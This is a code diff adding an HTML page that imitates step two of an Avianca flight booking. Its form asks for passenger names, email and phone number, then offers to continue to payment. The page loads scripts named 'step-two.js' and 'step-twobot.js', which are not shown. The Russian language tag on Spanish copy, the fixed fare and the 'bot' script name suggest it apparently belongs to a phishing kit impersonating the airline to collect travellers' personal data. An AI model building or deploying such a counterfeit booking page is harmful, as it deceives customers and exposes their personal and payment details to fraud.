@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avianca - Booking</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="shortcut icon" href="./assets/a.png" t  ype="image/x-icon">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="./css/flight.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+
+    <!-- START -->
+    <script src="./js/functions.js"></script>
+</head>
+<body class="mvh-100 sb-hidden bg-gray">
+
+    <!-- ON LOADER -->
+    <div class="loader show">
+        <img class="" src="./assets/svg/plane-loader.gif">
+    </div>
+
+
+    <header>
+        <div class="next-step">
+            <img class="ns-logo" src="./assets/logos/avianca_red (2).svg">
+            <div class="ns-step">
+                <img src="./assets/svg/step_2_header.png">
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <div class="main-form mb-10">
+            <form class="form-control" id="next-step">
+
+                <div class="form-section">
+                    <div class="form-title">
+                        <h2>Datos personales</h2>
+                        <img src="./assets/svg/arrow_top.png" alt="">
+                    </div>
+
+                    <select id="select-passengers">
+                    </select>
+
+                    <h3>Pasajero - <span id="editing-label">Adulto 1</span></h3>
+                    <p class="fs-4">Ingresa el nombre y primer apellido (de cada pasajero) tal y como aparecen en el pasaporte o documento de identidad. También, agrega el número de viajero frecuente LifeMiles o de una aerolínea aliada para disfrutar de más beneficios.</p>
+                    
+                    <input id="name" class="mt-5" type="text" placeholder="Nombre">
+                    <span name="name-error" class="input-error-label">Por favor, ingresa tu primer nombre</span>
+                    <input id="surname" class="mt-4" type="text" placeholder="Apellido" >
+                    <span name="surname-error" class="input-error-label">Por favor, ingresa tu primer apellido</span>
+
+
+                    <div class="checkbox-group mt-4">
+                        <input class="check" type="checkbox">
+                        <label for="">Tengo un número de viajero frecuente <span class="bold-gray">LifeMiles</span> o de otra aerolínea aliada (opcional).</label>
+                    </div>
+                    <div class="checkbox-group mt-2">
+                        <input class="check" type="checkbox">
+                        <label for="">Necesito asistencia especial (opcional)</label>
+                    </div>
+                    
+
+                    <div class="mt-4 show justify-content-center">
+                        <button id="btn-next-passenger" type="button" class="btn btn-gray">
+                            Próximo Pasajero
+                        </button>
+                    </div>
+                </div>
+                
+
+                <hr>
+
+                <div class="form-section">
+                    <div class="form-info">
+                        <img src="./assets/svg/tel_icon.png" alt="" width="25px" height="25px" style="margin-right: 12px;">
+                        <div>
+                            <p class="fs-2">Información de contacto</p>
+                            <p class="fs-4 mt-2">Estos datos serán utilizados para informarte sobre tu reserva.</p>
+                        </div>
+                    </div>
+
+                    <input id="email" class="mt-5" type="email" placeholder="Correo">
+                    <span name="name-error" class="input-error-label">Por favor, ingresa tu correo</span>
+                    <input id="number" class="mt-4" type="number" placeholder="Número de teléfono" oninput="limitDigits(this, 10)">
+                    <span name="name-error" class="input-error-label">Por favor, ingresa tu número de teléfono</span>
+
+                    <div class="checkbox-group mt-4">
+                        <input class="check" type="checkbox" name="" id="">
+                        <label for="">Acepto el uso de mis datos personales para recibir promociones, ofertas y novedades que Avianca tiene para mí.</label>
+                    </div>
+
+                    <div class="mt-4 show justify-content-center">
+                        <button type="submit" class="btn btn-gray">
+                            Continuar a pagar
+                        </button>
+                    </div>
+                </div>
+
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer-fixed-2">
+        <div class="footer-flight-resume">
+            <div>
+                <p class="mb-1">Resumen del viaje:</p>
+                <div class="show align-items-center">
+                    <h4 id="origin-code">BOG</h4>
+                    <img src="./assets/svg/arrow (1).png" width="14px">
+                    <h4 id="destination-code">CLI</h4>
+                </div>
+            </div>
+            <div>
+                <h4 class="text-end mt-1">$<span id="flight-cost">65.600</span> COP</h4>
+                <p class="fs-5">Total de tu reserva:</p>
+                <img src="./assets/svg/info_icon (1).png" width="15px">
+            </div>
+        </div>
+
+        <p class="mt-2 mb-2">© Avianca S.A 2024</p>
+    </footer>
+
+    <!-- SCRIPTS -->
+    <script src="./js/step-two.js"></script>
+    <script src="./js/step-twobot.js"></script>
+</body>
+</html>
